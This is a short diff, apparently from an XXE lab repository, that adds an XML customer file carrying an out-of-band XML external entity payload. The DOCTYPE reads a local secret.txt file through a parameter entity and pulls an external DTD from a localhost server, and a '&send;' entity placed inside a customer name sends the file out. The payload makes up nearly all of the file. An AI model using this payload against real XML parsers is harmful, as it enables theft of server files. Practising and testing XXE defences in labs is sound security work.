@@ -1,0 +1,11 @@
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % file SYSTEM "file:///home/feabell/isig-xxe/xxe/secret.txt">
+   <!ENTITY % dtd SYSTEM "http://127.0.0.1/payload.dtd" > %dtd;]>
+<customers>
+<customer id="1">
+<name>John</name>
+</customer>
+<customer id="2">
+<name>Jane &send;</name>
+</customer>
